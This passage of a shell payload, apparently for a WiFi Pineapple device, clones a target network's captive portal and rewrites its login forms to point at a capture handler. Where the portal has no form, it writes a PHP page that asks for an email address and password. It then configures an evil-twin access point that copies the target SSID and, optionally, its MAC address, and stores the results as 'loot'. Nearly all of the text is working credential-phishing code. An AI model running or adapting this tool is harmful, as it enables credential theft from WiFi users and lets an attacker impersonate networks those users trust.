    # Fallback: Manual URL Entry
    # -------------------------------------------------------------------------
    if [ $PORTAL_DETECTED -eq 0 ]; then
        LOG yellow "No captive portal detected via automatic methods"
        
        local resp
        resp=$(CONFIRMATION_DIALOG "No captive portal detected.\n\nTried: DNS hijack, HTTP,\nHTTPS, gateway access.\n\nEnter URL manually?")
        
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
                return 1
                ;;
        esac
        
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            PORTAL_URL=$(TEXT_PICKER "Enter portal URL" "http://")
            
            case $? in
                $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                    return 1
                    ;;
            esac
            
            if [ -n "$PORTAL_URL" ]; then
                PORTAL_DETECTED=1
            fi
        else
            return 1
        fi
    fi
    
    LOG ""
    LOG green "Portal URL: $PORTAL_URL"
    return 0
}

# =============================================================================
# PHASE 5: CLONE CAPTIVE PORTAL
# =============================================================================
clone_portal() {
    LOG "=== CLONING CAPTIVE PORTAL ==="
    led_cloning
    
    # Create directory name from SSID
    local safe_ssid=$(sanitize_ssid "$TARGET_SSID")
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local portal_name="${safe_ssid}_${timestamp}"
    local clone_dir="$PORTAL_DIR/$portal_name"
    local loot_clone_dir="$LOOT_DIR/$portal_name"
    
    mkdir -p "$clone_dir"
    mkdir -p "$loot_clone_dir"
    mkdir -p "$TEMP_DIR/clone"
    
    LOG "Cloning to: $clone_dir"
    
    # Extract base URL for wget
    local base_url=$(echo "$PORTAL_URL" | sed -E 's|(https?://[^/]+).*|\1|')
    LOG "Base URL: $base_url"
    
    # Check connectivity before cloning
    if ! check_connectivity; then
        LOG yellow "Connection lost, attempting reconnect..."
        if ! auto_reconnect; then
            ERROR_DIALOG "Connection lost and\nreconnection failed."
            return 1
        fi
    fi
    
    # Track response time for rate limiting tuning
    track_response_time "$PORTAL_URL" >/dev/null
    
    # Clone using wget with recursive depth
    LOG "Downloading portal pages..."
    
    local spinner_id
    spinner_id=$(START_SPINNER "Cloning portal...")
    
    # Download main page and linked resources
    # Note: wget uses --directory-prefix so no cd needed
    
    wget --quiet \
         --recursive \
         --level=2 \
         --page-requisites \
         --convert-links \
         --adjust-extension \
         --no-parent \
         --no-host-directories \
         --directory-prefix="$TEMP_DIR/clone" \
         --timeout=$TIMEOUT \
         --tries=2 \
         --reject "*.exe,*.zip,*.tar,*.gz,*.pdf,*.doc*,*.xls*" \
         --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" \
         "$PORTAL_URL" 2>/dev/null || true
    
    # Also try to get the root page if we got a deeper URL
    if [ "$PORTAL_URL" != "$base_url/" ]; then
        wget --quiet \
             --page-requisites \
             --convert-links \
             --no-host-directories \
             --directory-prefix="$TEMP_DIR/clone" \
             --timeout=$TIMEOUT \
             --tries=2 \
             --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" \
             "$base_url/" 2>/dev/null || true
    fi
    
    STOP_SPINNER $spinner_id
    
    # Check what we got
    local file_count=$(find "$TEMP_DIR/clone" -type f 2>/dev/null | wc -l)
    LOG "Downloaded $file_count files"
    
    if [ "$file_count" -eq 0 ]; then
        # Try alternative method with curl
        LOG "Trying curl method..."
        
        curl -s -L -m $TIMEOUT \
             -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" \
             -o "$TEMP_DIR/clone/index.html" \
             "$PORTAL_URL" 2>/dev/null
        
        file_count=$(find "$TEMP_DIR/clone" -type f 2>/dev/null | wc -l)
    fi
    
    if [ "$file_count" -eq 0 ]; then
        ERROR_DIALOG "Failed to download portal.\n\nThe portal may require authentication or use HTTPS."
        return 1
    fi
    
    # Move files to portal directory
    cp -r "$TEMP_DIR/clone/"* "$clone_dir/" 2>/dev/null
    
    # Also save to loot
    cp -r "$TEMP_DIR/clone/"* "$loot_clone_dir/" 2>/dev/null
    
    # Find and rename main HTML file to index.html if needed
    if [ ! -f "$clone_dir/index.html" ] && [ ! -f "$clone_dir/index.php" ]; then
        local main_html=$(find "$clone_dir" -name "*.html" -o -name "*.htm" | head -1)
        if [ -n "$main_html" ]; then
            cp "$main_html" "$clone_dir/index.html"
        fi
    fi
    
    # Modify form actions to point to captiveportal handler
    LOG "Modifying form actions..."
    
    find "$clone_dir" -name "*.html" -o -name "*.htm" -o -name "*.php" 2>/dev/null | while read -r file; do
        # Preserve URL parameters as hidden fields (for Coova/ChilliSpot style portals)
        preserve_url_params "$file" "$PORTAL_URL"
        
        # Replace form action to point to goodportal captiveportal handler
        sed -i 's|action="[^"]*"|action="/captiveportal/"|g' "$file" 2>/dev/null
        sed -i "s|action='[^']*'|action='/captiveportal/'|g" "$file" 2>/dev/null
        
        # Ensure form method is POST
        sed -i 's|method="[Gg][Ee][Tt]"|method="POST"|g' "$file" 2>/dev/null
    done
    
    # Create portal info file
    cat > "$clone_dir/portal_info.txt" << EOF
Portal Clone Information
========================
Source SSID: $TARGET_SSID
Source BSSID: $TARGET_BSSID
Portal URL: $PORTAL_URL
Clone Date: $(date)
Files: $file_count
EOF
    
    # Set permissions
    chmod -R 755 "$clone_dir"
    find "$clone_dir" -type f -exec chmod 644 {} \;
    
    # Detect portal template
    LOG "Detecting portal template..."
    local index_content=""
    if [ -f "$clone_dir/index.html" ]; then
        index_content=$(cat "$clone_dir/index.html" 2>/dev/null)
    elif [ -f "$clone_dir/index.php" ]; then
        index_content=$(cat "$clone_dir/index.php" 2>/dev/null)
    fi
    
    if [ -n "$index_content" ]; then
        local template
        template=$(detect_portal_template "$index_content")
        if [ -n "$template" ]; then
            LOG green "  Template: $template"
            echo "Template: $template" >> "$clone_dir/portal_info.txt"
        fi
    fi
    
    # Take screenshot if headless browser available
    if [ "$USE_HEADLESS_BROWSER" -eq 1 ] && [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
        LOG "Taking portal screenshot..."
        if take_portal_screenshot "$PORTAL_URL" "$clone_dir/screenshot.png"; then
            LOG green "  Screenshot saved"
            cp "$clone_dir/screenshot.png" "$loot_clone_dir/" 2>/dev/null
        fi
    fi
    
    # Inline assets for offline use
    LOG "Inlining external assets..."
    local html_files
    html_files=$(find "$clone_dir" -name "*.html" 2>/dev/null)
    for hf in $html_files; do
        inline_assets "$hf" "$base_url"
    done
    
    # Verify portal
    LOG "Verifying cloned portal..."
    if verify_portal "$clone_dir"; then
        LOG green "  Portal verification passed"
    else
        LOG yellow "  Portal may have issues (check log)"
    fi
    
    # V1.3: Extended analysis
    LOG "=== EXTENDED PORTAL ANALYSIS ==="
    
    # Extract SSL certificate info if HTTPS
    if [[ "$PORTAL_URL" =~ ^https ]]; then
        extract_ssl_cert_info "$PORTAL_URL" "$clone_dir/ssl_cert_info.txt"
        cp "$clone_dir/ssl_cert_info.txt" "$loot_clone_dir/" 2>/dev/null
    fi
    
    # Detect API endpoints
    detect_api_endpoints "$clone_dir" "$clone_dir/api_endpoints.txt"
    cp "$clone_dir/api_endpoints.txt" "$loot_clone_dir/" 2>/dev/null
    
    # Analyze form fields
    analyze_form_fields "$clone_dir" "$clone_dir/form_analysis.txt"
    cp "$clone_dir/form_analysis.txt" "$loot_clone_dir/" 2>/dev/null
    
    # Analyze cookies
    analyze_cookies "$clone_dir/cookie_analysis.txt"
    cp "$clone_dir/cookie_analysis.txt" "$loot_clone_dir/" 2>/dev/null
    
    # Check for MAC-based bypass
    detect_mac_bypass "$PORTAL_URL"
    
    # Sanitize HTML (remove tracking)
    LOG "Sanitizing HTML (removing trackers)..."
    local sanitize_files
    sanitize_files=$(find "$clone_dir" -name "*.html" -o -name "*.htm" 2>/dev/null)
    for hf in $sanitize_files; do
        sanitize_html "$hf"
    done
    
    # Log response time stats
    local avg_time
    avg_time=$(get_avg_response_time)
    if [ "$avg_time" -gt 0 ]; then
        LOG "  Avg response time: ${avg_time}ms"
        log_to_file "Average response time: ${avg_time}ms"
    fi
    
    # Create archive
    local archive_path
    archive_path=$(create_portal_archive "$clone_dir" "$portal_name")
    
    LOG green "Portal cloned successfully!"
    LOG "  Location: $clone_dir"
    LOG "  Backup: $loot_clone_dir"
    if [ -n "$archive_path" ]; then
        LOG "  Archive: $archive_path"
    fi
    if [ -n "$LOG_FILE" ]; then
        LOG "  Log: $LOG_FILE"
    fi
    
    # Store for later use
    CLONED_PORTAL_DIR="$clone_dir"
    CLONED_PORTAL_NAME="$portal_name"
    
    return 0
}

# =============================================================================
# PHASE 6: GENERATE INDEX.PHP FOR CREDENTIAL CAPTURE
# =============================================================================
create_credential_handler() {
    LOG "Creating credential capture handler..."
    
    # Check if cloned portal has a form
    local has_form=$(grep -riE "<form" "$CLONED_PORTAL_DIR" 2>/dev/null | wc -l)
    
    if [ "$has_form" -gt 0 ]; then
        LOG "Forms detected in portal - forms will submit to /captiveportal/"
    else
        LOG "No forms detected - creating basic login overlay..."
        
        # Create a simple index.php that wraps the cloned content with a login form
        cat > "$CLONED_PORTAL_DIR/index.php" << 'PHPEOF'
<?php
// Credential capture wrapper for cloned portal
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Redirect to captiveportal handler
    $data = http_build_query($_POST);
    header("Location: /captiveportal/?$data");
    exit;
}

// Check if original index.html exists
$original = __DIR__ . '/original_index.html';
if (!file_exists($original) && file_exists(__DIR__ . '/index.html')) {
    rename(__DIR__ . '/index.html', $original);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
        h1 { text-align: center; margin-bottom: 30px; color: #333; font-size: 24px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        input[type="email"], input[type="text"], input[type="password"] { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        input:focus { outline: none; border-color: #4a90d9; }
        button { width: 100%; padding: 14px; background: #4a90d9; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: 600; }
        button:hover { background: #357abd; }
        .terms { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>WiFi Login</h1>
        <form method="POST" action="/captiveportal/">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter password">
            </div>
            <input type="hidden" name="hostname" value="<?php echo gethostname(); ?>">
            <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
            <button type="submit">Connect to WiFi</button>
            <p class="terms">By connecting, you agree to the Terms of Service</p>
        </form>
    </div>
</body>
</html>
PHPEOF
        
        # Rename original index.html
        if [ -f "$CLONED_PORTAL_DIR/index.html" ]; then
            mv "$CLONED_PORTAL_DIR/index.html" "$CLONED_PORTAL_DIR/original_index.html"
        fi
    fi
    
    LOG green "Credential handler created"
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

LOG cyan "=========================================="
LOG cyan "  CLONE CAPTIVE PORTAL"
LOG cyan "=========================================="
LOG ""

LED SETUP

# Initialize directories
mkdir -p "$LOOT_DIR"
mkdir -p "$PORTAL_DIR"
mkdir -p "$TEMP_DIR"

# =============================================================================
# DEPENDENCY CHECK
# =============================================================================
# Map commands to their package names (command:package)
DEPENDENCIES="curl:curl wget:wget iw:iw wpa_supplicant:wpa_supplicant wpa_cli:wpa-cli"

LOG "Checking dependencies..."

MISSING_DEPS=""
MISSING_PKGS=""

# First pass: check what's missing
for dep in $DEPENDENCIES; do
    cmd="${dep%%:*}"
    pkg="${dep##*:}"
    
    if ! command -v "$cmd" >/dev/null 2>&1; then
        LOG yellow "  Missing: $cmd"
        MISSING_DEPS="$MISSING_DEPS $cmd"
        # Avoid duplicate packages
        if ! echo "$MISSING_PKGS" | grep -q "$pkg"; then
            MISSING_PKGS="$MISSING_PKGS $pkg"
        fi
    else
        LOG green "  Found: $cmd"
    fi
done

# If anything is missing, prompt to install
if [ -n "$MISSING_DEPS" ]; then
    LOG ""
    LOG yellow "Missing dependencies:$MISSING_DEPS"
    LOG yellow "Required packages:$MISSING_PKGS"
    
    resp=$(CONFIRMATION_DIALOG "Missing dependencies!\n\nInstall required packages?\n$MISSING_PKGS\n\nThis may take a few minutes.")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
            ERROR_DIALOG "Cannot proceed without\nrequired dependencies."
            exit 1
            ;;
        $DUCKYSCRIPT_ERROR)
            LOG red "Dialog error"
            exit 1
            ;;
    esac
    
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG ""
        LOG "Updating package lists..."
        opkg_spinner=$(START_SPINNER "Updating opkg...")
        opkg update >/dev/null 2>&1
        STOP_SPINNER "$opkg_spinner"
        
        for pkg in $MISSING_PKGS; do
            LOG "Installing $pkg..."
            pkg_spinner=$(START_SPINNER "Installing $pkg...")
            opkg install "$pkg" >/dev/null 2>&1
            STOP_SPINNER "$pkg_spinner"
            
            if opkg list-installed | grep -q "^${pkg} "; then
                LOG green "  Installed: $pkg"
            else
                LOG red "  Failed to install: $pkg"
                ERROR_DIALOG "Failed to install: $pkg\n\nCheck /etc/opkg/distfeeds.conf\nfor broken repositories."
                exit 1
            fi
        done
        
        # Verify all commands are now available
        LOG ""
        LOG "Verifying installation..."
        for dep in $DEPENDENCIES; do
            cmd="${dep%%:*}"
            if ! command -v "$cmd" >/dev/null 2>&1; then
                LOG red "  Still missing: $cmd"
                ERROR_DIALOG "Installation incomplete!\n\nMissing: $cmd"
                exit 1
            else
                LOG green "  Verified: $cmd"
            fi
        done
        LOG green "All dependencies installed!"
    else
        LOG "User declined installation"
        exit 1
    fi
fi

LOG ""

# =============================================================================
# OPTIONAL DEPENDENCIES
# =============================================================================
OPTIONAL_DEPS="openssl:openssl-util grep:grep"
OPTIONAL_MISSING=""

LOG "Checking optional dependencies..."
for dep in $OPTIONAL_DEPS; do
    cmd="${dep%%:*}"
    pkg="${dep##*:}"
    
    if ! command -v "$cmd" >/dev/null 2>&1; then
        LOG yellow "  Optional missing: $cmd"
        OPTIONAL_MISSING="$OPTIONAL_MISSING $pkg"
    else
        LOG green "  Found: $cmd"
    fi
done

# Check for GNU grep (needed for -P flag)
HAVE_GNU_GREP=0
if command -v grep >/dev/null 2>&1; then
    if grep --version 2>/dev/null | grep -q "GNU"; then
        HAVE_GNU_GREP=1
        LOG green "  GNU grep available (PCRE support)"
    else
        LOG yellow "  BusyBox grep (limited pattern support)"
    fi
fi

# Check for openssl
HAVE_OPENSSL=0
if command -v openssl >/dev/null 2>&1; then
    HAVE_OPENSSL=1
    LOG green "  OpenSSL available (SSL cert extraction)"
else
    LOG yellow "  OpenSSL missing (SSL features disabled)"
fi

# Prompt to install optional dependencies if any missing
if [ -n "$OPTIONAL_MISSING" ]; then
    resp=$(CONFIRMATION_DIALOG "Optional packages missing:\n$OPTIONAL_MISSING\n\nInstall for full features?\n(SSL certs, better parsing)")
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "Installing optional packages..."
        for pkg in $OPTIONAL_MISSING; do
            LOG "  Installing $pkg..."
            opkg install "$pkg" >/dev/null 2>&1
            if opkg list-installed | grep -q "^${pkg} "; then
                LOG green "    Installed: $pkg"
            else
                LOG yellow "    Failed: $pkg (continuing)"
            fi
        done
        # Re-check capabilities
        command -v openssl >/dev/null 2>&1 && HAVE_OPENSSL=1
        grep --version 2>/dev/null | grep -q "GNU" && HAVE_GNU_GREP=1
    fi
fi

LOG ""

# =============================================================================
# HEADLESS BROWSER OPTION (for JS-heavy portals)
# =============================================================================
check_headless_available
if [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
    LOG "Headless browser available: $HEADLESS_TOOL"
    resp=$(CONFIRMATION_DIALOG "Headless browser detected!\n\n$HEADLESS_TOOL is available.\n\nEnable for JS-heavy portals?\n(Slower but more thorough)")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
            USE_HEADLESS_BROWSER=0
            ;;
    esac
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        USE_HEADLESS_BROWSER=1
        LOG green "  Headless browser enabled"
    else
        USE_HEADLESS_BROWSER=0
        LOG "  Headless browser disabled"
    fi
else
    LOG "Headless browser not available (optional)"
fi

LOG ""

# =============================================================================
# CONFIGURATION PERSISTENCE
# =============================================================================
if [ -f "$CONFIG_FILE" ]; then
    resp=$(CONFIRMATION_DIALOG "Load saved settings?\n\nPrevious config found.")
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        load_config
        LOG green "  Settings loaded"
    fi
fi

# =============================================================================
# SCAN FILTER OPTIONS
# =============================================================================
resp=$(CONFIRMATION_DIALOG "Configure scan filters?\n\n- Signal strength filter\n- Band selection (2.4/5GHz)\n\nSkip for defaults.")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG "Using default scan settings"
        ;;
esac

if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # Signal strength filter
    resp=$(CONFIRMATION_DIALOG "Filter weak signals?\n\nHide networks weaker than\n-85 dBm (very weak)")
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        FILTER_WEAK_SIGNALS=1
        LOG green "  Weak signal filter enabled"
    fi
    
    # Band selection
    LOG "Band selection..."
    resp=$(CONFIRMATION_DIALOG "Scan 2.4GHz only?\n\n(Better range, more networks)")
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        BAND_FILTER="2.4"
        LOG green "  2.4GHz only"
    else
        resp=$(CONFIRMATION_DIALOG "Scan 5GHz only?\n\n(Faster, less interference)")
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            BAND_FILTER="5"
            LOG green "  5GHz only"
        else
            BAND_FILTER="all"
            LOG "  All bands"
        fi
    fi
fi

LOG ""

# Initialize logging
init_logging
log_to_file "Configuration: Interface=$INTERFACE, Band=$BAND_FILTER, WeakFilter=$FILTER_WEAK_SIGNALS"
log_to_file "User Agent: ${CURRENT_USER_AGENT:-rotating}"

# Save original interface state before modifying
save_interface_state

# =============================================================================
# MAIN SCAN/CONNECT LOOP
# =============================================================================
# Loop allows user to retry after connection failures
while true; do
    # Phase 1: Scan for SSIDs
    if ! scan_ssids; then
        resp=$(CONFIRMATION_DIALOG "Scan failed!\n\nWould you like to\ntry again?")
        case $? in
            "$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_CANCELLED")
                LOG "User chose to exit"
                exit 0
                ;;
        esac
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            continue
        else
            exit 0
        fi
    fi

    # Phase 2: Select target SSID
    if ! select_ssid; then
        resp=$(CONFIRMATION_DIALOG "Selection cancelled.\n\nWould you like to\nscan again?")
        case $? in
            "$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_CANCELLED")
                LOG "User chose to exit"
                exit 0
                ;;
        esac
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            continue
        else
            exit 0
        fi
    fi

    # Phase 3: Connect to network
    if ! connect_to_network; then
        resp=$(CONFIRMATION_DIALOG "Connection failed!\n\nWould you like to\ntry another network?")
        case $? in
            "$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_CANCELLED")
                LOG "User chose to exit"
                exit 0
                ;;
        esac
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            continue
        else
            exit 0
        fi
    fi

    # Phase 4: Detect captive portal
    if ! detect_captive_portal; then
        resp=$(CONFIRMATION_DIALOG "No captive portal found\non this network.\n\nTry another network?")
        case $? in
            "$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_CANCELLED")
                LOG "User chose to exit"
                exit 0
                ;;
        esac
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            continue
        else
            exit 0
        fi
    fi

    # If we get here, we found a portal - break out of loop
    break
done

# Phase 5: Clone the portal
if ! clone_portal; then
    exit 1
fi

# Phase 6: Create credential handler
create_credential_handler

# Success!
led_success
VIBRATE 100

LOG ""
LOG green "=========================================="
LOG green "  CLONE COMPLETE!"
LOG green "=========================================="
LOG ""
LOG "Portal saved to:"
LOG "  $CLONED_PORTAL_DIR"
LOG ""

# =============================================================================
# SAVE CONFIGURATION
# =============================================================================
resp=$(CONFIRMATION_DIALOG "Save current settings?\n\nBand: $BAND_FILTER\nSignal filter: $FILTER_WEAK_SIGNALS\n\nReuse next time.")
if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    save_config
    LOG green "  Settings saved"
fi

# =============================================================================
# GOODPORTAL INTEGRATION
# =============================================================================
resp=$(CONFIRMATION_DIALOG "Deploy to goodportal?\n\nCopy portal to /www/portals\nfor immediate use with\ngoodportal_configure.")
if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    if integrate_with_goodportal "$CLONED_PORTAL_DIR" "$CLONED_PORTAL_NAME"; then
        LOG green "Portal deployed to goodportal!"
        LOG "  Run 'goodportal Configure' to start serving"
    else
        LOG yellow "Goodportal integration had issues"
    fi
fi

# =============================================================================
# PHASE 7: DEPLOYMENT OPTIONS
# =============================================================================

# Ask if user wants to configure Open AP with cloned SSID
RESP=$(CONFIRMATION_DIALOG "Configure Evil Twin?\n\nSet Open AP SSID to:\n$TARGET_SSID\n\n[Yes] = Auto-configure\n[No] = Manual setup later")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Deployment skipped"
        ALERT "Portal Cloned!\n\nSSID: $TARGET_SSID\nSaved: $CLONED_PORTAL_NAME\n\nRun 'goodportal Configure'\nto deploy manually"
        exit 0
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG yellow "Dialog error, skipping deployment"
        exit 0
        ;;
esac

CONFIGURE_OPEN_AP=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        CONFIGURE_OPEN_AP=1
        ;;
    *)
        LOG "Skipping Open AP configuration"
        ALERT "Portal Cloned!\n\nSSID: $TARGET_SSID\nSaved: $CLONED_PORTAL_NAME\n\nRun 'goodportal Configure'\nto deploy manually"
        exit 0
        ;;
esac

# Backup current Open AP config before modifying
backup_open_ap_config

# Ask about MAC cloning for full evil twin
RESP=$(CONFIRMATION_DIALOG "Clone MAC address too?\n\nTarget: $TARGET_BSSID\n\n[Yes] = Full impersonation\n[No] = SSID only")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Cancelled"
        exit 0
        ;;
esac

CLONE_MAC=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        CLONE_MAC=1
        LOG "MAC cloning: YES"
        ;;
    *)
        LOG "MAC cloning: NO"
        ;;
esac

# Ask about SSID Pool
RESP=$(CONFIRMATION_DIALOG "Add to SSID Pool?\n\nSSID: $TARGET_SSID\n\n[Yes] = Save for future use\n[No] = Open AP only")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        LOG yellow "Cancelled"
        exit 0
        ;;
esac

ADD_TO_POOL=0
case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        ADD_TO_POOL=1
        LOG "Add to SSID Pool: YES"
        ;;
    *)
        LOG "Add to SSID Pool: NO"
        ;;
esac

LOG ""
LOG yellow "Applying configuration..."

# Configure Open AP
if [ "$CLONE_MAC" -eq 1 ]; then
    set_open_ap "$TARGET_SSID" "$TARGET_BSSID"
else
    set_open_ap "$TARGET_SSID" ""
fi

# Add to SSID Pool if requested
if [ "$ADD_TO_POOL" -eq 1 ]; then
    LOG "Adding to SSID Pool..."
    PINEAPPLE_SSID_POOL_ADD "$TARGET_SSID"
    sleep 1
    LOG green "  Added to SSID Pool"
fi

led_success
VIBRATE 100

LOG ""
LOG green "=========================================="
LOG green "  EVIL TWIN CONFIGURED!"
LOG green "=========================================="
LOG ""
LOG "Open AP now broadcasting:"
LOG "  SSID: $TARGET_SSID"
[ "$CLONE_MAC" -eq 1 ] && LOG "  MAC:  $TARGET_BSSID"
LOG ""
LOG cyan "Configuration is PERSISTENT!"
LOG cyan "Check: Settings > Open AP"
LOG ""
LOG "Portal ready at: $CLONED_PORTAL_DIR"
LOG ""
LOG yellow "Next step: Run 'goodportal Configure'"
LOG yellow "and select '$CLONED_PORTAL_NAME'"
LOG ""

# Show result
if [ "$CLONE_MAC" -eq 1 ]; then
    ALERT "Evil Twin Ready!\n\nSSID: $TARGET_SSID\nMAC: $TARGET_BSSID\n\nRun 'goodportal Configure'\nto serve the cloned portal"
else
    ALERT "Evil Twin Ready!\n\nSSID: $TARGET_SSID\n\nRun 'goodportal Configure'\nto serve the cloned portal"
fi

# Ask if user wants to restore Open AP config later
RESP=$(CONFIRMATION_DIALOG "Restore original Open AP\nconfig when done?\n\nOriginal: $ORIGINAL_OPEN_AP_SSID\n\n[Yes] = Restore now\n[No] = Keep evil twin")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
        exit 0
        ;;
esac

case "$RESP" in
    "$DUCKYSCRIPT_USER_CONFIRMED")
        LOG "Restoring original Open AP config..."
        restore_open_ap_config
        led_success
        ALERT "Original config restored!\n\nSSID: $ORIGINAL_OPEN_AP_SSID\n\nPortal still saved at:\n$CLONED_PORTAL_NAME"
        ;;
    *)
        LOG "Keeping evil twin configuration"
        rm -f /tmp/clone_portal_backup_*
        ;;
esac

exit 0
